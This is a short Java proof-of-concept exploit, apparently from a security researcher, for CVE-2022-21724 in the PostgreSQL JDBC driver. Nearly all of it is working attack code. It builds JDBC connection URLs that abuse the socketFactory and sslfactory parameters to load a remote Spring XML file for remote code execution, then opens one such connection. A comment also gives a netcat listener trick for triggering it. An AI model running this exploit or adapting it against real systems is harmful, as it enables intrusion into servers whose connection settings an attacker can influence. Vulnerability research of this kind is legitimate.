package org.example;

import org.postgresql.Driver;

import java.sql.DriverManager;

/**
 * CVE-2022-21724
 *
 * version
 *
 * [9.4.1208, 42.2.25)
 * [42.3.0, 42.3.2)
 *
 * @author Whoopsunix
 */
public class RceAttack {
    public static void main(String[] args) throws Exception {
        /**
         * 寻找 AbstractXmlApplicationContext 的实现 加载 xml
         *  ClassPathXmlApplicationContext
         *  FileSystemXmlApplicationContext
         */
        String serializeURL = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:5432/poc.xml";


        /**
         * sslFactory / sslFactoryArg
         * nc 监听请求 返回一个 S 就会请求 sslFactoryArg 地址
         *  nc -l 5432
         */
        String sslURL = "jdbc:postgresql://127.0.0.1:5432/test?sslfactory=org.springframework.context.support.FileSystemXmlApplicationContext&sslfactoryarg=http://127.0.0.1:1234/poc.xml";


        DriverManager.registerDriver(new Driver());
        DriverManager.getConnection(sslURL);

    }
}
